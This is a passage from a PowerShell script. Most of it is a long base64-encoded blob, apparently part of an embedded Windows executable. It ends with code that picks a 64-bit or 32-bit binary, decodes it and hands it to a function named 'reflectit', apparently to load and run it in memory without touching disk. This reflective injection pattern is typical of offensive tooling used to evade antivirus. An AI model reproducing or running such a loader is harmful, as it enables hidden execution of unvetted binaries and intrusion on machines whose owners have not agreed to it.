WU5dzm2OcU5zjnbOfE5Kzo0Okg6Tjp7OqE6qjqwOsM6jzuvO7k72TsZPB88fDyFPIo8nTyxPLY8yTzhPP48Kz01PT495T3uPfY9MT47PkQ+TT5iPms+mj6jPqw+uj7DPuU+7D77Phc/Pz9SP10/aT9wP4I/jj+3P+I/AAAAQAAAZAAAAAEwHDAyMGYwdjD5MBAxWDFwMXUx7DGCMpMyMzS7NNs2YzeXN583sTe+N+A3QDhwOCU5ODmwOVU6djqEOoo6pTrNOuE6/ToHOxE7Hzs6O0s7VzumO7U7lTzCPgAAAFAAAJAAAAAGMXwx7DMrNEM0STRwNDQ21TbgOOU4JTkxOUo6UTp6OpY6tjrEOss60TrzOgc7GDskOzM7Szt0O4c7rzvKO8871DvvO/w7BTwKPA88Kjw0PEA8RTxKPGU8bzx7PIA8hTyjPK08uTy+PMM85Dz0PAw9hD2XPbU9wz1xP6g/rz+0P7g/vD/APwAAAGAAAIQAAAAWMFswYDBkMGgwbDDTMuMyEzNjM3YzfzOMM5szsDO6M80z1DPgM/gz/TMJNA40IjTxNPg0CjUeNSY1MDU5NUo1XDVrNas1sTXFNeI1/DULNhk2JTYxNj82TzZkNns2njazNsk21jbkNvI2/TYTNyc3MDeLN+83bTnrOgAAAHAAAHgAAADSMtoy4TKNM0w0nDWwNdM15zUJNh026zdzOHc4ezh/OIM4hziLOI84/ziXOZs5nzmjOac5qzmvObM5IzqrOq86szq3Ors6vzrDOsc6ODvHO8s7zzvTO9c72zvfO+M7VDzjPOc86zzvPPM89zz7PP88AIAAACAAAAC5ORY84D7nPgw/ED8UPxg/HD90P84/AAAAkAAAHAAAAIg3oTf5NxY47zgNOTY5WDr9OgAAAKAAABgAAAC5MB0yTz7KPrg/wj/PPwAAALAAAMwAAAAAMDIwQzBOMJswvjDFMNQw8jAKMSUxMDGMMqIyvDLKMtEy2TLxMv8yBzMfMzgzfTOHM4wzkjMENA00RjRRNFw2ZjZ/Nok2tja9Nhg4ojjDON448zj4OAI5BzkSOR05Kjk4OXM5nTnoOfQ5+Tn/OQQ6DDoSOho6Mzo4OkE6iDoROxo7RztQO1g7szsoPLg8VT2kPa897j0XPmo+rz6zPrs+xz7hPho/Lz86P0I/TT9TP14/ZD9yP5A/qT+uP8c/2D/dPwAAAMAAAOwAAABMMGkwmDCjMOcxADItMjQyPzJNMlQyWjJ1MnwywDLwMiMzNjN8M4IzrjO0M8Yz1zPcM+Ez8TP2M/szCzQQNBU0OjRWNGQ0cDR8NJA0pjTMNPg0ATU5NVE1YTV1NXo1fzWcNd41AjYSNhc2HDY3NkE2UTZWNls2djaFNpA2lTaaNrU2xDbPNtQ22Tb3NgY3ETcWNxs3PDdMN4U3qTfNN+Q36Tf0Nxs4LTg5OEc4aDhvOIY4nDipOK44vDjyOH45mDmdOdA7CDw6PFU8jzzGPNg8DD0vPZM9oz3mPew9yD6lP6w/AAAA0AAAYAAAAPkwTzFxMh40cDShNNs0MDWfNbU1UDYrNzI3YDdnN4g3sTfGN9g35Tf+Nxc4NThcOHE4gTiOOLc4vjjfOAg5HTkvOTw5VTlmOXA5kjmjObg5wjnlOe85cz8A4AAAMAAAAK0yzTJNNX41sDX5Nb82yjY3N0k3TzehOLM49zk+Ovc71j5nP+U/AAAA8AAApAAAAAswJzD1MFgxdzGaMeUx7DHzMfoxFDIjMi0yOjJEMlQyqjLiMgoz+TQcNWE1bTV/NcA1DDYVNhk2HzYjNik2LTY3Nko2UzZuNps2xTYHN4Y3szfaNyU4SzmSOdI5MzpCOn86jTqZOqw6ujqBO+k77jz0PAI9ET0DPh0+Yz5yPoA+nT6lPs4+1T7xPvg+Dz8lP2A/Zz+3P8s/+z8AAAAAAQCAAAAABDAlMDcwSTBbMG0wfzCRMKMwtTDHMNkw6zD9MB4xMDFCMVQxZjHpMrIzSjSXNG811jUANjA2ljbPNuY2BjeINww4EzgdOEE4cTipOME43zjqOEk5UDlXOV45azm8OcE5xjnLOdQ5lTqeOv46BzsfO0s7cTt+PLI+ABABAGwAAAAGMS8xWjHeMWIylTKqMrsyJTM7M4ozpjPIMxo0WjSsNAY1EjZSNow2wTbhNuw2+jaFN7Y31TfnN/E3Ezg0OKE4xzjuOA85ijmwOdc59jmyOuI6/DovO0w7aztEPMQ8Mz09PZE9ACABABQAAABENgg3Xz5nPp4+pT4AMAEAMAAAADgyPjNGM30zhDMFN9I63DrmOvA6rT20PXw+gz4cPys/hT+ZP9I/AAAAQAEAXAAAAGgwfDApMdQxRTKnMiYzXDOqM0I0gjSoNek3hTmLOeo58Dn9OQg6GDpROsc62TrrOiE7VDvWO+w7UjyPPJk8tDwRPUQ9ZD2LPVU+Xz6JPgc/Jj8yPwBQAQCIAAAAYjHNMecx9DEkMkgyUzJgMnIyujLTMlczbDN1M34z9jakN0M4QzlqOU86VTpaOmE6cTp/OpA6qDquOro62TrfOu468zo5O0E7STtRO1k7dzt/O+E77TsBPA08GTw5PIA8qjyyPM883zzrPPo8DT4+PoA+tz7UPug+8z5AP8k/AAAAYAEAbAAAAAwwPjCmMCYxtjHWMeYxOzI8M0wzXTNlM3UzhjPtM/gz/jMHNEE0UDRcNGs0fjSdNMg04zQsNTU1PjVHNXI1lDW4NSo2KjeJN+Q3UjhxOKI49DkuO0k7Xzt1O3074T7pP/o/AAAAcAEALAAAANYy2zLtMgszHzMlMwE0ODSCN/E3BjhdOQ06qzrUOvE6HjsAAACAAQAsAQAAtDG8McgxzDHQMdQx2DHcMegx7DHwMVAyVDJYMlwyYDJkMmgybDJwMnQyiDKMMpAyFDYcNiQ2LDY0Njw2RDZMNlQ2XDZkNmw2dDZ8NoQ2jDaUNpw2pDasNrQ2vDbENsw21DbcNuQ27Db0Nvw2BDcMNxQ3HDckNyw3NDc8N0Q3TDdUN1w3ZDdsN3Q3fDeEN4w3lDecN6Q3rDe0N7w3xDfMN9Q33DfkN+w39Df8NwQ4DDgUOBw4JDgsODQ4PDhEOEw4VDhcOGQ4bDh0OHw4tD64Prw+wD7EPsg+zD7QPtQ+2D7wPvg+AD8IPxA/GD8gPyg/MD84P0A/SD9QP1g/YD9oP3A/eD+AP4g/kD+YP6A/qD+wP7g/wD/IP9A/2D/gP+g/8D/4PwCQAQCsAAAAADAIMBAwGDAgMCgwMDA4MEAwSDBQMFgwYDBoMHAweDCAMIgwkDCYMKAwqDCwMLgwwDDIMNAw2DDgMOgw8DD4MAAxCDEQMRgxIDEoMTAxODFAMUgxUDFYMWAxaDFwMXgxgDGIMZAxmDGgMagxsDG4McAxyDHQMdgx4DHoMfAx+DEAMggyEDIYMiAyKDIwMjgyQDJIMlAyWDJgMmgykDiUOJg4AAAAoAEAMAEAAIgykDKYMpwyoDKkMqgyrDKwMrQyvDLAMsQyyDLMMtAy1DLYMuQy7DL0Mvgy/DIAMwQzcDR0NHg0fDSANIQ0iDSMNJA0lDSYNJw0oDSkNKg0rDSwNLQ0uDS8NIg5jDmQOZQ5mDmcOaA5pDmoOaw5sDm0Obg5vDnAOcQ5EDoUOhg6HDogOiQ6KDosOjA6NDo4Ojw6QDpEOkg6TDpQOlQ6WDpcOmA6ZDpoOmw6cDp0Ong6fDqAOoQ6iDqMOpA6lDqYOpw6oDqkOqg6rDqwOrQ6uDrEOsg6zDrQOtQ62DrcOuA65DroOuw68Dr0Ovg6/DoAOwQ7CDsMOxA7FDsYOxw7IDskOyg7LDswOzQ7ODs8O0A7RDtIO0w7UDtUO1g7XDtgO2Q7aDtsO3A7ALABANgBAADUNtg23DbgNiQ3LDc0Nzw3RDdMN1Q3XDdkN2w3dDd8N4Q3jDeUN5w3pDesN7Q3vDfEN8w31DfcN+Q37Df0N/w3BDgMOBQ4HDgkOCw4NDg8OEQ4TDhUOFw4ZDhsOHQ4fDiEOIw4lDicOKQ4rDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDkUORw5JDksOTQ5PDlEOUw5VDlcOWQ5bDl0OXw5hDmMOZQ5nDmkOaw5tDm8OcQ5zDnUOdw55DnsOfQ5/DkEOgw6FDocOiQ6LDo0Ojw6RDpMOlQ6XDpkOmw6dDp8OoQ6jDqUOpw6pDqsOrQ6vDrEOsw61DrcOuQ67Dr0Ovw6BDsMOxQ7HDskOyw7NDs8O0Q7TDtUO1w7ZDtsO3Q7fDuEO4w7lDucO6Q7rDu0O7w7xDvMO9Q73DvkO+w79Dv8OwQ8DDwUPBw8JDwsPDQ8PDxEPEw8VDxcPGQ8bDx0PHw8hDyMPJQ8nDykPKw8tDy8PMQ8zDzUPNw85DzsPPQ8/DwEPQw9FD0cPSQ9LD00PTw9RD1MPVQ9XD1kPWw9dD18PYQ9jD2UPZw9pD2sPbQ9vD3EPcw91D3cPeQ97D30Pfw9BD4MPhQ+HD4kPiw+ND48PgDAAQDQAQAAQDhIOFA4WDhgOGg4cDh4OIA4iDiQOJg4oDioOLA4uDjAOMg40DjYOOA46DjwOPg4ADkIORA5GDkgOSg5MDk4OUA5SDlQOVg5YDloOXA5eDmAOYg5kDmYOaA5qDmwObg5wDnIOdA52DngOeg58Dn4OQA6CDoQOhg6IDooOjA6ODpAOkg6UDpYOmA6aDpwOng6gDqIOpA6mDqgOqg6sDq4OsA6yDrQOtg64DroOvA6+DoAOwg7EDsYOyA7KDswOzg7QDtIO1A7WDtgO2g7cDt4O4A7iDuQO5g7oDuoO7A7uDvAO8g70DvYO+A76DvwO/g7ADwIPBA8GDwgPCg8MDw4PEA8SDxQPFg8YDxoPHA8eDyAPIg8kDyYPKA8qDywPLg8wDzIPNA82DzgPOg88Dz4PAA9CD0QPRg9ID0oPTA9OD1APUg9UD1YPWA9aD1wPXg9gD2IPZA9mD2gPag9sD24PcA9yD3QPdg94D3oPfA9+D0APgg+ED4YPiA+KD4wPjg+QD5IPlA+WD5gPmg+cD54PoA+iD6QPpg+oD6oPrA+uD7APsg+0D7YPuA+6D7wPvg+AD8IPxA/GD8gPyg/MD84P0A/SD9QP1g/AOABAEwAAABKM04zUjNWM0w8VDxcPGQ8bDx0PHw8hDyMPJQ8nDykPKw8tDy8PMQ8zDzUPNw85DzsPPQ8/DwEPQw9FD0cPSQ9LD0AAADwAQCMAAAA5DToNOw08DT0NPg0/DQANQQ1CDUMNRA1FDUYNRw1IDUkNSg1LDUwNTQ1ODU8NUA1RDVINUw1UDVUNSQ7KDssOzA7NDs4Ozw7UDtUO1g7XDtgO2Q7aDsoPjA+OD48PkA+WD6UPpg+nD6gPqQ+qD4wPzQ/OD88P0A/RD9IP0w/UD9UPwAAAAACAIQBAAD0MAQxhDGIMZAxADJMMlAyYDJkMmwyhDKUMpgyqDKsMrAyuDLQMuAy5DL0Mvgy/DIAMwgzIDMwMzQzRDNIM0wzVDNsM3wzgDOYM5wzoDO0M7gz0DPUM9gz3DPgM+Qz+DP8MwA0GDQoNCw0PDRANFQ0WDRwNHQ0jDSQNKg0rDSwNLg00DTgNOQ06DTsNPA0BDUINRg1HDUgNSQ1LDVENUg1YDVkNXw1gDWENYw1oDWkNbg1vDXANdQ15DXoNfg1CDYYNig2LDYwNkg2TDZkNmg2gDaYObg59Dn4OQA6CDoQOhQ6LDowOjg6TDpUOlw6ZDpoOmw6dDqIOqQ6qDrIOtA61DrwOvg6/DoMOzA7PDtEO2w7cDuMO5A7mDugO6g7rDu0O8g75DvoOwg8KDxIPFA8XDyQPLA80DzwPAw9ED0wPVA9cD2QPbA90D3wPRA+MD5QPnA+kD6wPtA+8D4QPzA/TD9QP3A/kD+sP7A/uD+8P8A/yD/cP+Q/+D8AAAAQAgAQAAAAADAIMBAwJDAAIAIAaAAAADgxaDF4MYgxmDGoMcAxzDHQMdQx8DH0MfwxIDckNyg3LDcwNzQ3ODc8N0A3RDdQN1Q3WDdcN2A3ZDdoN2w3sDi4OMQ45DgEOSQ5QDlcOYQ5nDm0Ocw57DkEOig6VDoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 
 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
 {
       [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
 }
 else
 {
       [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes86)
 }

reflectit -PEBytes $PEBytes -ExeArgs $arguments

 }
